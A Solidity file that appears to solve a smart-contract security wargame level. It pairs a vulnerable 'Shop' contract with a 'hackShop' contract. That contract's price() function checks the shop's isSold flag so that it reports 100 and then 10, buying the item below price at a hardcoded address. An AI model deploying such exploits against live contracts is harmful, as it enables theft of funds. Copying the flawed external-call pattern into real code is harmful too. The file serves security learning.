// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract hackShop {
    address shop = 0x8b1614CEb8bF1418B6CB95bc10CF4feED1330c6b;

    function callbuy() public {
        (bool ok, ) = shop.call(abi.encodeWithSignature("buy()"));
        require(ok, "calling the buy failed");
    }

    function price() external view returns (uint) {
        // since the bool is sold that changed first we can make a call to the shop contract to check if the isSold
        //returns true we will se the price lower , otherwise we will return 100;
        (, bytes memory data) = shop.staticcall(
            abi.encodeWithSignature("isSold()")
        );
        bool check = abi.decode(data, (bool));
        if (check) {
            return 10;
        } else {
            return 100;
        }
    }
}
